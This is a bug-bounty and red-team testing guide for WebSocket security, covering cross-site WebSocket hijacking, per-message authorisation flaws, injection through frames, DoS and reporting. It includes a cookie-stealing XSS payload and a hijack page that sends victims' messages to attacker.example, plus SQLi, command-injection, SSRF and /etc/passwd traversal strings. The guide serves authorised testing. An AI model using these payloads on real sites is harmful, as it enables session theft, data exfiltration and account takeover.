# WebSocket Security — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Web apps & APIs using WebSockets (`ws://`/`wss://`) — chat/messaging, live dashboards, notifications, trading/price feeds, collaborative editors, multiplayer, IoT/telemetry, and framework transports (socket.io, SignalR, STOMP, SockJS, graphql-ws, MQTT-over-WS)
**Platforms:** Burp Suite (WebSockets history + repeat/edit frames); `websocat`/`wscat`/Python `websockets`; browser DevTools (Network → WS); Kali/Windows
**Companion files:**
- `WEBSOCKET_ARSENAL.md` — handshake/CSWSH PoCs, frame-tamper payloads, websocat/wscat one-liners, framework recipes
- `WEBSOCKET_CHECKLIST.md` — the per-endpoint testing-order checklist
- `WEBSOCKET_REPORT_TEMPLATE.md` — the report skeleton (CSWSH cross-origin proof front-and-center)
- `poc/` — a benign cross-site WebSocket-hijack PoC page + a frame replay/tamper helper + a message fuzz helper
- `WebSocket_Attacks_Zero_to_Expert.md` — Q&A study + field reference (beginner primer → expert chains)

> **Companion to the CORS / CSRF / GraphQL / IDOR guides.** Same philosophy: *find* is Part I–III, *get paid* is Part IV. WebSockets are the surface everyone proxies past: testers watch the HTTP, then a `wss://` channel quietly carries chat, orders, and admin actions with **no CORS, no per-message auth, and an `Origin` header nobody checks**. The expert skills are (1) **CSWSH** — hijacking the victim's authenticated socket from any website (it's CSRF that can also *read the responses*), and (2) treating every **message field as an injection/IDOR sink** (the WS is just a tunnel to the backend).

---

> ### ⚡ READ THIS FIRST — the four ideas that turn a WebSocket into a finding
> 1. **The handshake is plain HTTP — and it carries cookies.** A WebSocket opens with an HTTP `GET ... Upgrade: websocket` request; the browser **auto-attaches the site's cookies** to it, exactly like any request. **CORS/SOP do NOT apply to WebSockets** — *any* origin can open a socket to *any* host. The **only** cross-origin defense is the server checking the **`Origin`** header at the handshake.
> 2. **CSWSH is the flagship bug.** **IF** the WS authenticates by **cookie** **AND** the server **doesn't validate `Origin`** → an attacker page runs `new WebSocket('wss://target/...')` in the victim's browser, connects **as the victim**, and can **send messages *and read the replies*** → steal private data, perform state-changing actions → **ATO**. It's CSRF — *but you also get the response back* (§5, §9).
> 3. **Every message is an injection/IDOR sink.** After the handshake it's just frames carrying JSON/commands. Auth is often checked **only at connect**, never **per message** — so swapping a user/object id in a frame reads/acts as someone else (**IDOR over WS**), and message fields rendered to others or hit the DB are **XSS / SQLi / NoSQLi / cmdi** (§6, §8).
> 4. **Prove it like CSRF, in a real browser.** A valid CSWSH PoC is an HTML page that — opened by the logged-in victim in a normal browser — connects to the target socket and exfiltrates a message. If auth is a **token in the WS URL/subprotocol** that the attacker's JS can't know, CSWSH fails — say so (§5.4, §15).
>
> **Where the money is (memorize this order):** ① **Message-tampering injection → RCE / SQLi data dump / stored-XSS** (the WS tunnels to the backend; §8) → ② **CSWSH → ATO / full private-data theft / state change** (cross-site authed socket; §5/§9) → ③ **Auth/authz over WS → IDOR/BFLA** (per-message authz missing; §6) → ④ **Rate-limit bypass over WS → OTP/credential brute → ATO** (§10) → ⑤ *then* cleartext `ws://` / token-in-URL (Medium info-leak) and unauth-DoS as scope allows.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)**

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [WebSocket Anatomy — Handshake, Frames & the Trust Model](#2-websocket-anatomy--handshake-frames--the-trust-model)
3. [Reconnaissance — Find WS Endpoints & Capture Traffic](#3-reconnaissance--find-ws-endpoints--capture-traffic)
4. [Baseline — Handshake, Auth Model & Message Map](#4-baseline--handshake-auth-model--message-map)

**PART II — HANDSHAKE & AUTH ATTACKS**
5. [Origin Validation & Cross-Site WebSocket Hijacking (CSWSH)](#5-origin-validation--cross-site-websocket-hijacking-cswsh)
6. [Authentication & Authorization over WebSockets](#6-authentication--authorization-over-websockets)
7. [Transport & Token Handling (ws:// & token-in-URL)](#7-transport--token-handling-ws--token-in-url)

**PART III — MESSAGE-LAYER & EXPLOITATION BY IMPACT (where the money is)**
8. [Message Tampering → Injection (XSS / SQLi / NoSQLi / cmdi / IDOR)](#8-message-tampering--injection)
9. [CSWSH → ATO / Data Theft / State Change](#9-cswsh--ato--data-theft--state-change)
10. [Rate-Limit / Brute-Force / Anti-Automation Bypass over WS](#10-rate-limit--brute-force--anti-automation-bypass-over-ws)
11. [Denial of Service (connections, large/compressed frames)](#11-denial-of-service)
12. [Smuggling & Reverse-Proxy Misconfig](#12-smuggling--reverse-proxy-misconfig)
13. [Framework Specifics (socket.io / SignalR / STOMP / SockJS / graphql-ws)](#13-framework-specifics)

**PART IV — VALIDITY, SEVERITY & REPORTING**
14. [The Escalation Mindset](#14-the-escalation-mindset)
15. [The Validity-First Mindset](#15-the-validity-first-mindset)
16. [False Positives — STOP reporting these](#16-false-positives--stop-reporting-these-auto-reject-list)
17. [Severity Calibration](#17-severity-calibration--how-triagers-rate-websocket-bugs)
18. [Impact-Escalation Playbooks — "you found X, now do Y"](#18-impact-escalation-playbooks--you-found-x-now-do-y)
19. [Building a Professional PoC](#19-building-a-professional-poc)
20. [Reporting, CWE/CVSS & De-duplication](#20-reporting-cwecvss--de-duplication)
21. [Automation & Red-Team Notes](#21-automation--red-team-notes)

**Appendices**
- [Appendix A — WebSocket Workflow Cheat Sheet](#appendix-a--websocket-workflow-cheat-sheet)
- [Appendix B — WebSocket Decision Tree](#appendix-b--websocket-decision-tree)
- [Appendix C — Important Links](#appendix-c--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine.** Work top-to-bottom. Each phase says *what to do*, *which § for detail*, and the *deliverable*.

```
PHASE 0  RECON & LAB        → find WS endpoints (JS, DevTools→WS, Burp) (§3) · proxy them through Burp (§1)
PHASE 1  BASELINE  ★        → read the HANDSHAKE: auth = cookie or token? is Origin checked?
                              is it wss:// ? map the message types & which carry ids/actions (§4)
PHASE 2  HANDSHAKE/AUTH      → CSWSH (cookie-auth + no Origin check) (§5) · auth-only-at-connect /
                              per-message authz / IDOR over WS (§6) · ws:// & token-in-URL (§7)
PHASE 3  MESSAGE & IMPACT ⭐  → tamper frames → injection (XSS/SQLi/NoSQLi/cmdi/IDOR, §8) ·
                              CSWSH→ATO/data theft/state change (§9) · rate-limit brute (§10) ·
                              DoS (§11) · smuggling/proxy (§12) · framework quirks (§13)
PHASE 4  VALIDATE → REPORT  → ★ CSWSH: cross-origin authed connect in a real browser (§15) ·
                              FP filter (§16) · severity+CWE-1385/346 (§17) · clean PoC (§19) · dedup (§20)
```

**Phase-by-phase, with the deliverable before moving on:**

1. **PHASE 0 — Recon & lab.** Find every `ws://`/`wss://` endpoint (JS `new WebSocket(`, DevTools Network→WS, Burp's WebSockets history) and proxy them (§3). *Deliverable:* the WS URL(s) + the JS that opens them.
2. **PHASE 1 — Baseline ★.** Capture the **handshake** and answer: is auth a **cookie** the browser auto-sends, or a **token** the JS adds (URL/subprotocol/first-message)? Does the server **check `Origin`**? Is it **`wss://`**? List the **message types** and which carry **ids/actions** (§4). *Deliverable:* the auth model + a message map.
3. **PHASE 2 — Handshake/auth.** Test **CSWSH** (§5), **per-message authz / IDOR** (§6), and **transport/token handling** (§7). *Deliverable:* a confirmed handshake or auth flaw.
4. **PHASE 3 — Message & impact ⭐.** Tamper frames for **injection** (§8), drive **CSWSH → ATO** (§9), **brute over WS** (§10), and consider **DoS/smuggling/framework** angles (§11–§13). *Deliverable:* a demonstrated high-impact outcome.
5. **PHASE 4 — Validate → report.** For CSWSH, **prove the cross-origin authenticated connect in a real browser** (§15); for injection, the classic proof. Apply the FP filter (§16), set CVSS/CWE (§17), ship a clean PoC (§19), de-dup (§20). *Deliverable:* the submitted report.

Reference anytime: payloads/PoCs → `WEBSOCKET_ARSENAL.md` & `poc/`; checklist → `WEBSOCKET_CHECKLIST.md`; playbooks **§18**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

| Tool | Job |
|------|-----|
| **Burp Suite** | **WebSockets history** (Proxy → WebSockets), **intercept/edit frames**, **resend** to a connected socket; "Send to Repeater" for WS; generate a **CSWSH PoC** (Engagement tools) |
| **browser DevTools → Network → WS** | watch frames live, read the handshake headers, copy the WS URL |
| **websocat / wscat** | CLI WebSocket clients — open a socket, set headers (`Origin`, `Cookie`, `Sec-WebSocket-Protocol`), send/receive frames, automate |
| **Python `websockets` / `aiohttp`** | scripted clients for fuzzing frames, brute-over-WS, CSWSH automation; the `poc/` helpers use this |
| **A web host for the PoC** | a **different origin** (your domain / a static host) to serve the CSWSH page — it must come from cross-site |
| **Two accounts (A/B)** | for per-message IDOR/authz over WS, and to keep CSWSH/PoCs on **your own** victim account |
| **interactsh** | OOB confirmation for blind injection/SSRF reached through a WS message |

```bash
# Quick CLI connect (set Origin + cookie to test the handshake):
websocat -H='Origin: https://evil.example' -H='Cookie: session=<victim>' 'wss://target.com/ws'
wscat -c 'wss://target.com/ws' -H 'Origin: https://evil.example'
```
> **The cardinal rule of WebSocket testing:** *the handshake decides the cross-origin game, the frames decide the injection game.* First read the handshake (cookie-vs-token auth, `Origin` check, `wss`), then treat every message field as untrusted input to the backend.

---

# 2. WebSocket Anatomy — Handshake, Frames & the Trust Model

## 2.0 WebSockets in 3 minutes (read this if WS is new)
A WebSocket gives a page a **persistent, two-way (full-duplex) connection** to a server — instead of request/response, both sides push **messages** any time. It's how chat, live prices, notifications, and collaborative apps work.
- **It starts as HTTP.** The browser sends a normal `GET` with `Upgrade: websocket` (the "handshake"); the server replies `101 Switching Protocols`; after that the same TCP connection carries **frames** (text or binary messages), not HTTP.
- **In JS it's one line:** `var ws = new WebSocket('wss://target.com/ws'); ws.onmessage = e => ...; ws.send('{"type":"hello"}')`.
- **`wss://`** = WebSocket over TLS (encrypted, like https). **`ws://`** = cleartext (like http — bad).
- **Cookies ride along** on the handshake automatically (it's an HTTP request to that host).
- **No CORS.** Browsers let a page open a WebSocket to **any** origin; the Same-Origin Policy that blocks cross-site `fetch` reads **does not apply** here. (This is the root of CSWSH.)

## 2.1 The handshake (what to read)
```http
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: chat, json          (optional subprotocol)
Origin: https://target.com                  ← the ONLY cross-origin signal the server gets
Cookie: session=...                          ← browser-attached automatically
```
Server: `101 Switching Protocols` + `Sec-WebSocket-Accept: <sha1(key+GUID)>`. **The three things that decide security live here:** is auth a **cookie** (auto-sent) or a **token** (JS-added)? does the server **validate `Origin`**? is it **`wss`**?

## 2.2 The attack surface (each → a section)
- **`Origin` not validated + cookie auth** → **CSWSH** — §5/§9 (the flagship)
- **Auth only at handshake / no per-message authz** → **IDOR / BFLA over WS** — §6
- **`ws://` cleartext / token in the URL** → sniffing, logged tokens — §7
- **Message fields → backend/DOM** → **XSS / SQLi / NoSQLi / cmdi / IDOR / path-traversal** — §8
- **No per-message rate limit** → **brute-force / OTP bypass** — §10
- **Unbounded connections / frames / `permessage-deflate`** → **DoS** — §11
- **Upgrade handling / reverse-proxy** → **smuggling / hijack** — §12

## 2.3 The 2026 mental model
- **Testers proxy past WS.** Burp shows HTTP by default; many bugs hide in the WebSockets tab that nobody opened. *Always check the WebSockets history.*
- **CSWSH > CSRF.** Same precondition (cookie auth, no anti-CSRF), but the attacker **reads the responses** over the socket — so it leaks data, not just fires blind actions.
- **The WS is a tunnel.** Whatever validation the app does on HTTP endpoints is frequently **absent on the message handlers** — re-test every injection/authz class on the frames.
- **Auth-at-connect ≠ auth-per-message.** A connection authenticated once is often trusted forever; per-object/per-action checks are missing → IDOR/BFLA by editing message ids.

---

# 3. Reconnaissance — Find WS Endpoints & Capture Traffic

**3.1 Find the sockets.**
- **DevTools → Network → WS** filter: use the app, watch which `ws(s)://` URLs open and the frames they exchange.
- **JS source:** grep bundles for `new WebSocket(`, `WebSocket(`, `io(` (socket.io), `signalr`, `SockJS(`, `wss://`, `/socket`, `/ws`, `/cable` (Rails ActionCable), `/graphql` (subscriptions), `/hub` (SignalR).
- **Burp:** Proxy → **WebSockets** history captures every frame once the browser connects through Burp.
- **Common paths:** `/ws`, `/wss`, `/socket`, `/socket.io/`, `/cable`, `/hub`, `/signalr`, `/graphql` (subscriptions), `/stomp`, `/mqtt`, `/live`, `/notifications`, `/stream`.

**3.2 Capture a clean handshake + a few messages** per endpoint (Burp / DevTools). Note the message **framing** (raw JSON? socket.io `42["event",{...}]`? STOMP frames? protobuf/binary?).

**3.3 Classify the auth.** From the handshake: a **`Cookie`** header (auto-sent → CSWSH-relevant), a **token in the URL** (`?token=`), a **`Sec-WebSocket-Protocol`** bearer, or a **first-message login** (`{"type":"auth","token":...}`).

**3.4 Map the messages.** For each message type, note: does it carry a **user/object id**? does it **change state** (send-money, change-setting, post)? is the content **rendered to other users** (chat → stored XSS)? does it reach a **DB/command/URL** (injection/SSRF)?

> *Deliverable:* `ws endpoint | auth model | Origin-checked? | wss? | message types (id/action/rendered/backend)`.

---

# 4. Baseline — Handshake, Auth Model & Message Map

This phase decides which attacks are even possible.

**4.1 The auth question (decides CSWSH).** Replay the handshake from **`websocat`/`wscat` with the victim's cookie but a foreign `Origin`**:
- **Connects & is authenticated** → cookie auth + no Origin check → **CSWSH is on** (§5).
- **Rejected on bad Origin** → Origin is validated (test bypasses §5.2 before dropping).
- **Auth is a token the JS adds (URL/subprotocol/first-message), not a cookie** → CSWSH usually **N/A** (the attacker can't supply the token) — pivot to message-layer bugs (§6/§8).

**4.2 The per-message authz question (decides IDOR/BFLA over WS).** Connect as **A**, then send a frame referencing **B's** id/resource. **IF** it returns/acts on B's data → IDOR over WS (§6).

**4.3 The injection question.** Pick message fields that look like they hit the backend or get rendered; mark them for §8 fuzzing.

**4.4 The transport question.** Is it `wss`? Is a token in the URL? (§7)

**4.5 The verdict:** per endpoint — `CSWSH-able`, `IDOR-over-WS`, `INJECTION-candidate`, `transport-weak`, or `looks-locked (retry bypasses)`.

> **Why test from `websocat` with a forged Origin first:** it's the fastest CSWSH oracle — a browser will *also* attach the cookie, so if the CLI connects authenticated with a foreign `Origin`, a cross-site page will too (§15 gives the real-browser proof).

---

# PART II — HANDSHAKE & AUTH ATTACKS

# 5. Origin Validation & Cross-Site WebSocket Hijacking (CSWSH)

**The flagship WebSocket bug.** CSWSH = **CSRF on a WebSocket, with the bonus that you can read the responses.**

**5.1 The conditions (ALL must hold).** **IF** (a) the WS authenticates via a **cookie** the browser auto-sends, **AND** (b) the server **does not validate the `Origin`** header at the handshake, **AND** (c) the cookie is sent cross-site (SameSite=None, or same-site position) → **THEN** any attacker page can open the socket **as the victim** and read/send messages. (CWE-1385 *Missing Origin Validation in WebSockets*.)

**5.2 Test Origin handling (and bypasses).** From `websocat`/`wscat`, send the handshake with the victim cookie and vary `Origin`:
- `Origin: https://evil.example` (totally foreign) — does it still connect authed? → **CSWSH**.
- **Weak allow-list bypasses** (same family as CORS): `https://target.com.evil.example`, `https://eviltarget.com`, `https://target.com.evil`, a **subdomain you control / can XSS** (`https://sub.target.com`), `null` origin (sandboxed iframe), trailing-dot/`%60`/case tricks. Any accepted foreign-ish origin = CSWSH.
- **No `Origin` at all** (non-browser client) often connects — note it, but the *browser* attack needs a foreign origin to be accepted.

**5.3 Confirm the hijack reads data.** Once connected cross-origin, send the app's "give me my data" message and capture the **reply** — that's the difference from CSRF (you get the response). (Full exploitation → §9.)

**5.4 The validity gate.** A real CSWSH must fire in a **default browser, cross-site**: an attacker HTML page (`new WebSocket('wss://target/ws')`) that the logged-in victim opens connects and exfiltrates a message to the attacker. **IF** the WS auth is a **token the JS must add** (URL/subprotocol/first-message) that the attacker can't know → CSWSH does **not** work; don't report it (§15, §16).

# 6. Authentication & Authorization over WebSockets

**6.1 Auth only at the handshake (never per message).** The connection is authenticated once and then trusted. Combine with §5 (if you can hijack/forge the connection) or with a low-priv account: once connected, **what can you send?**

**6.2 Missing per-message authorization → IDOR / BFLA over WS.** Edit ids/actions in frames:
```
{"type":"getMessages","conversationId": <B's id>}     → reads B's conversation (IDOR)
{"type":"placeOrder","accountId": <B's id>, ...}      → acts as B (BFLA/IDOR)
{"type":"adminBroadcast", ...}                         → privileged action as a normal user (BFLA)
```
**IF** swapping a victim id in a message returns/affects their data → **IDOR over WebSocket** (use the IDOR kit's two-account proof). Per-message authz is one of the most-forgotten checks.

**6.3 Unauthenticated message types.** Some servers accept *some* messages before/without auth (a "subscribe"/"join" that leaks data). Connect with **no** auth and enumerate which message types still work.

**6.4 Privilege confusion / channel join.** Pub/sub apps let clients **subscribe to channels/topics**; subscribe to **another user's / an admin channel** (`user.<B>`, `admin`, `tenant.<other>`) — if you receive their stream, it's authz-broken pub/sub (cross-ref IDOR cross-tenant).

# 7. Transport & Token Handling (ws:// & token-in-URL)

**7.1 Cleartext `ws://`.** No TLS → handshake (cookies) and all frames are sniffable on the network → MITM/token theft. Report (CWE-319) — Low/Medium alone, higher if it carries auth/PII.

**7.2 Token in the WS URL.** `wss://target/ws?token=<JWT>` — the URL is **logged** (server/proxy logs, browser history, `Referer` if the page is linked, analytics). Tokens belong in the handshake auth, not the query string. (CWE-598/200.)

**7.3 Mixed content.** A `https://` page opening `ws://` is blocked by modern browsers (mixed content) — but a misconfig may downgrade; note it.

**7.4 Long-lived tokens / no expiry on the socket.** A socket authenticated once may stay valid long after logout/token-revocation — test whether killing the session/token actually drops the socket.

---

# PART III — MESSAGE-LAYER & EXPLOITATION BY IMPACT (where the money is)

# 8. Message Tampering → Injection

After the handshake it's just frames — **apply every injection class to every message field** (Burp: intercept/edit a frame, or resend an edited copy). The message handler usually skips the validation the HTTP layer did.

**8.1 XSS (stored/reflected) via messages.** In chat/comment/notification apps, a message you send is **rendered in other users' DOM**. Send `<img src=x onerror=alert(document.domain)>` / `<svg onload=...>` in a chat frame → if it executes in a recipient's browser → **stored XSS over WebSocket** (often missed because it's not an HTTP form). Chain to session/ATO via the XSS kit.
```
{"type":"chat","room":"general","text":"<img src=x onerror=fetch('//YOUR.oast.fun/'+document.cookie)>"}
```
**8.2 SQLi / NoSQLi.** A message field used in a DB query: `{"search":"' OR '1'='1"}`, `{"id":{"$ne":null}}` (Mongo). Error/UNION/time-based as usual → data dump / auth bypass. (SQLi/NoSQLi kits.)

**8.3 OS command injection / SSRF.** A field reaching a shell or an outbound request (`{"convert":"pdf; id"}`, `{"fetchUrl":"http://169.254.169.254/..."}`) → time-based RCE / SSRF→metadata (interactsh to confirm blind).

**8.4 IDOR / object reference** (see §6.2) — swap ids in frames.

**8.5 Path traversal / LFI** — `{"file":"../../etc/passwd"}` in a "download/preview" message.

**8.6 Type juggling / schema confusion** — send arrays/objects where a scalar is expected, extra fields (mass-assignment over WS: `{"updateProfile":{"role":"admin"}}`), or malformed frames to trip the parser.

**8.7 Deserialization / binary frames** — if messages are binary (protobuf, MessagePack, Java/.NET serialized), decode and tamper; serialized-object messages can be **insecure deserialization → RCE**.

> Treat the WS exactly like a parameterized HTTP endpoint that nobody hardened. **Injection through a message → RCE / SQLi dump / stored-XSS is the top-impact WebSocket outcome** (§17).

# 9. CSWSH → ATO / Data Theft / State Change

Turn the §5 hijack into impact. From the **attacker's** page (running in the victim's browser):

**9.1 Exfiltrate private data.** Open the socket, send the app's "load my conversations / account / orders" message, and **`fetch()` the responses to your server**. CSWSH leaks the victim's live private data because the responses come back to your JS.

**9.2 State change → ATO.** Send a state-changing message **as the victim**: change email/recovery, add a payment method, post/transfer, change settings. Change email → trigger reset → **ATO** (like CSRF, but you can also read the confirmation message).

**9.3 Read the session/token over the socket.** If the app echoes the user's profile/token in a message, the hijack hands you their credentials.

**9.4 Scope it.** State which messages you could send/read and the worst outcome (full inbox theft, ATO, admin action). That's what sets severity (§17).

# 10. Rate-Limit / Brute-Force / Anti-Automation Bypass over WS

**10.1 HTTP limits don't cover WS messages.** A login/OTP/coupon endpoint that's rate-limited over HTTP is frequently **unlimited over the WebSocket** message channel. Send many `{"type":"verifyOtp","code":"0001"}` frames on one socket → brute the code → **ATO**.

**10.2 One socket, many messages.** No per-message throttle = high-rate brute with one connection and one log line. Confirm by counting accepted attempts vs the documented cap.

**10.3 Combine with §6** (no per-message authz) to brute actions against other users.

# 11. Denial of Service

> ⚠️ **Measure, don't flood — and only with explicit permission/scope.**

**11.1 Connection exhaustion.** Open many sockets / never close them → exhaust server connection/memory limits (note missing per-IP/per-user connection caps).

**11.2 Large / fragmented frames.** Send oversized or many-fragment messages → memory/CPU pressure if no max-frame-size.

**11.3 `permessage-deflate` decompression bomb.** If the server negotiates the compression extension, a small highly-compressible payload can **decompress to a huge buffer** server-side (a "zip-bomb" for WS) → memory DoS. Report missing decompressed-size limits.

**11.4 Slow / idle sockets.** Holding many idle/half-open sockets (no ping/pong timeout) ties up resources.

# 12. Smuggling & Reverse-Proxy Misconfig

**12.1 WebSocket upgrade smuggling.** Some reverse proxies mishandle the `Upgrade`/`Connection` headers (esp. HTTP/2→HTTP/1.1 downgrades, h2c) — a crafted upgrade can **smuggle** a request past front-end controls or **tunnel** to internal services. (Cross-ref the Request Smuggling kit.)

**12.2 Proxy auth/Origin stripping.** A gateway meant to enforce auth/Origin on `/ws` may not, while the backend trusts the gateway → direct-to-backend or header-spoofed connects.

**12.3 Internal WS exposed.** Admin/internal WS endpoints (metrics, debug, orchestration) reachable from the internet → unauth control. Hunt them via JS/recon (§3).

# 13. Framework Specifics

Recognise the transport — the framing and handshake differ, and each has quirks:
- **socket.io / engine.io** — handshake at `/socket.io/?EIO=4&transport=websocket`; messages framed like `42["event",{...}]` (the `42` = Engine.IO "message"+Socket.IO "event"). Tamper inside the JSON array; CSWSH applies (it's a WS under the hood). Old versions had CORS/`allowRequest` Origin gaps.
- **SignalR (.NET)** — `/negotiate` HTTP endpoint issues a `connectionToken`, then a WS hub at `/hub`. Test the negotiate auth and hub method authorization (BFLA: invoke privileged hub methods).
- **STOMP over WS** — frames like `SEND`/`SUBSCRIBE` with `destination:` headers → **subscribe to other users'/admin destinations** (authz-broken pub/sub, §6.4); header injection in STOMP frames.
- **SockJS** — falls back to XHR/EventSource when WS is blocked; test the fallback transports too (and their Origin/CSRF handling).
- **graphql-ws / subscriptions-transport-ws** — GraphQL subscriptions over WS; `connection_init` + `subscribe` frames → **CSWSH + GraphQL BOLA** (see the GraphQL kit §15.5).
- **Rails ActionCable** (`/cable`), **Phoenix Channels**, **MQTT-over-WS** — all carry channel/topic subscriptions → test channel authz.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 14. The Escalation Mindset

Every WebSocket finding has a "now do Y."
- CSWSH connects cross-origin → **read private data AND send a state-changing message → ATO** (§9), don't stop at "it connected."
- A message field → is it **rendered to others** (stored XSS) / **hits the DB** (SQLi) / **reaches a shell/URL** (cmdi/SSRF)? → chase RCE/dump.
- Connected socket → **swap ids** (IDOR) and **invoke privileged message types** (BFLA).
- A gate (login/OTP) → is it **rate-limited over WS**? → brute → ATO.
- Always ask: *what's the most sensitive message this socket can send or receive, and who can be the victim?*

# 15. The Validity-First Mindset

> **The rule:** prove **impact in the real conditions**, not just "a socket opened."
- **CSWSH** → an **attacker-origin HTML page**, opened by the **logged-in victim in a default browser**, connects to the target WS **using the victim's cookie** and **exfiltrates a message** (or sends a state change). Show the cross-origin handshake (`Origin: attacker`) being accepted *authenticated*. Cookie auth + no Origin check are the gate — if auth is a JS-added token, it's not CSWSH.
- **IDOR/BFLA over WS** → two accounts: A's socket, B's id in the frame, B's data back (IDOR proof).
- **Injection** → the classic signal (XSS fires in a recipient / SQL error/UNION/time / OOB callback), reproducible.
- **Rate-limit bypass** → a measured count (N message attempts accepted where the cap is 1/5).
- **DoS** → a measured resource amplification with permission; never a sustained outage.

# 16. False Positives — STOP reporting these (auto-reject list)

| Pattern | Why it's NOT (yet) a valid finding | What to do instead |
|---|---|---|
| **"No `Origin` check"** but auth is a **JS-added token** (URL/subprotocol/first-msg) | The attacker can't supply the token cross-site → no CSWSH | Only CSWSH if auth is a **cookie** the browser auto-sends |
| **CSWSH "works" from `websocat`/curl** only | Non-browser clients ignore SOP anyway; that's not the attack | Prove it in a **real browser, cross-site** (§15) |
| **Origin reflected/accepted** but **no sensitive data/action** on the socket | No impact | Find a message that reads private data or changes state |
| **`ws://` on a non-auth, public feed** | No secret to sniff | Report only if it carries auth/PII |
| **"Sent a weird frame, got an error"** | Not a vuln | Show injection executing / data crossing users |
| **DoS "possible" with no measurement** / no permission | Theoretical / out of scope | Measure amplification with permission |
| **Self-XSS in your own chat to yourself** | No victim | Show it rendering in **another** user's session |

> If you can't state "a **cross-site page** read/sent the victim's messages" (CSWSH) or "this **message field** executed/leaked across users" (injection/IDOR), you don't have it yet.

# 17. Severity Calibration — how triagers rate WebSocket bugs

**CWE:** **CWE-1385** (Missing Origin Validation in WebSockets → CSWSH), **CWE-346** (Origin Validation Error), **CWE-352** (CSRF, related to CSWSH), **CWE-319** (cleartext `ws://`), **CWE-598/200** (token in URL / info exposure), **CWE-306/862/285** (missing authn/authz over WS), plus the **injection CWEs** (79/89/943/77/78/918/22) and **CWE-770/400** (DoS).

| Scenario | Typical severity | CVSS 3.1 (example) |
|---|---|---|
| **Message injection → RCE / full DB dump** | **Critical** | `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` (~9.x) |
| **CSWSH → ATO / full private-data theft** | **High/Critical** | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` (~8; UI:R = victim opens the page) |
| **Stored XSS via chat message → session theft** | **High** | `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N` |
| **IDOR / BFLA over WS (cross-user read/action)** | **High/Medium** | per data sensitivity (IDOR kit §21) |
| **Rate-limit bypass over WS → OTP/credential brute → ATO** | **High** | `…/C:H/I:H` |
| **Cleartext `ws://` carrying auth/PII · token in URL** | **Medium** | `…/C:L–H` |
| **CSWSH with no sensitive data/action · DoS (measured)** | **Low/Medium** | minimal C, or A:H |
| **"No Origin check" with token-auth (no real CSWSH)** | **N/A** | not a finding (§16) |

> **Drivers:** what the socket can *read* (private data) and *do* (state change/ATO) × who the victim can be. CSWSH is `UI:R` (victim opens the attacker page) like CSRF, but rates higher because it **also reads responses**. Lead with the **highest proven** row.

# 18. Impact-Escalation Playbooks — "you found X, now do Y"

**18.1 You found: the WS connects from a foreign `Origin` with the victim's cookie.** → It's CSWSH-able → write the attacker HTML PoC (`new WebSocket`), have it **exfiltrate a private message** AND **send a state-change** → demonstrate **data theft + ATO** on your own victim account → report High/Critical (§9).

**18.2 You found: chat/comment messages render in other users' UIs.** → Inject `<img onerror>`/`<svg onload>` in a frame → confirm it executes in a **recipient's** browser → **stored XSS over WS** → steal session/token → ATO (XSS kit).

**18.3 You found: a connected socket accepts ids you don't own.** → Two-account test: A's socket + B's id in the frame → B's data back → **IDOR over WS**; try privileged message types → **BFLA** (IDOR kit).

**18.4 You found: a message field that searches/queries/fetches.** → SQLi/NoSQLi/cmdi/SSRF probes in that field (use variables/typed payloads) → dump/auth-bypass/RCE/metadata.

**18.5 You found: login/OTP works over the socket.** → Fire many attempts on one socket → show the HTTP rate-limit is bypassed → brute → ATO (§10).

**18.6 You found: only "no Origin check" but token-auth.** → Not CSWSH (§16). Pivot to message-layer injection/IDOR, or report the weaker transport issues (§7) if they carry secrets.

# 19. Building a Professional PoC

**The non-negotiables:**
1. **CSWSH:** a self-contained **attacker-origin HTML page** that opens the socket, and on `onmessage` **sends the data to your server** (or shows it). Host it on a **different origin**; open it as the **logged-in victim** in a default browser.
2. **Show the handshake** with `Origin: <attacker>` being **accepted authenticated** (Burp/DevTools), and the **leaked message** / the **state change confirmed on the victim**.
3. **Benign markers** — exfil to **your** server, change a field to an obvious test value, use **your own** two accounts; never touch real users.
4. **Reversible** — revert any state changes.
5. A **websocat/wscat** repro a triager can run, plus the browser PoC + screenshots.

```html
<!-- CSWSH PoC (host on attacker origin; open as the logged-in victim) -->
<script>
  var ws = new WebSocket("wss://target.com/ws");      // victim cookie auto-attaches; no Origin check = hijack
  ws.onopen   = () => ws.send('{"type":"getMessages"}');
  ws.onmessage = e => fetch("https://attacker.example/leak?d=" + encodeURIComponent(e.data));
</script>
```
```bash
# CLI repro (shows the handshake is accepted from a foreign Origin with the victim cookie):
websocat -H='Origin: https://evil.example' -H='Cookie: session=<victim>' 'wss://target.com/ws'
```

# 20. Reporting, CWE/CVSS & De-duplication

- **Title** = `<sub-bug> on <ws endpoint> → <impact>` — e.g. *"Cross-Site WebSocket Hijacking on /ws (no Origin validation, cookie auth) → theft of any user's private messages + account takeover"*; *"Stored XSS via chat WebSocket message → session theft"*; *"IDOR over WebSocket on getMessages → read any conversation."* Never "WebSocket misconfig."
- **Lead with the impact + the proof** (CSWSH: cross-origin authed connect in a browser; injection: the executed payload).
- **CWE-1385/346** for CSWSH (+ outcome CWE); injection/IDOR CWEs for the message-layer. CVSS per §17.
- **De-dup:** one strong CSWSH→ATO or message-injection beats a pile of "no Origin check" notes. If "missing Origin check" is known, report your **distinct impact** (data theft, ATO, XSS).

# 21. Automation & Red-Team Notes

**21.1 Coverage.** Burp's **WebSockets** history + match/replace; `websocat`/Python `websockets` scripts to replay/fuzz frames and automate CSWSH; **graphql-cop** flags WS CSRF on graphql-ws. But the bugs are in **authz/rendering logic** — drive the message types manually.

**21.2 Stealth / OPSEC (red-team & program rules).**
- **CSWSH PoC** exfiltrates to **your** server and uses **your** victim test account — never a real user.
- **Brute over WS** — prove the rate-limit bypass with a **measured count**; don't actually crack a real account.
- **DoS** — measure connection/compression amplification with permission; never sustain an outage.
